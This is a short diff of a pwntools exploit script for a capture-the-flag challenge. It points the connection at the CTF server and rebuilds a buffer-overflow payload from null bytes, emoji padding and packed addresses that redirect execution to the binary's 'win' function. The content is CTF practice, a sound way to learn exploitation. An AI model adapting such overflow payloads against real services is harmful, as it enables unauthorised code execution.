@@ -28,30 +28,18 @@ def GDB():
 
 
 if args.REMOTE:
-    # p = remote('ctf.msec.cloud-ip.cc', 1005)
-    p = remote('0', 1337)
+    p = remote('ctf.msec.cloud-ip.cc', 1005)
+    # p = remote('0', 1337)
 
 else:
-    p = process([exe.path])
+    p = process([exe.path, 'wrapper.py'])
 
 GDB()
 
-emoji = ("🔥"*67)
-
-
-load = flat(
-    b'\0'*4,
-    emoji,
-    # b'\0'*0x110,
-    0x404441,
-    exe.sym.win + 8
-)
-
-# # socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"python3 wrapper.py"
-# target = load[::-1].decode('latin-1')
-# starget = load.decode('latin-1')
+load = "\x00"*4 + "🔥"*(67) + "\x41\x44\x40".ljust(7, "\x00")  + "\xbe\x11\x40".ljust(8, "\x00")
 
 sl(load)
-# sl("A")
+
+
 p.interactive()
 
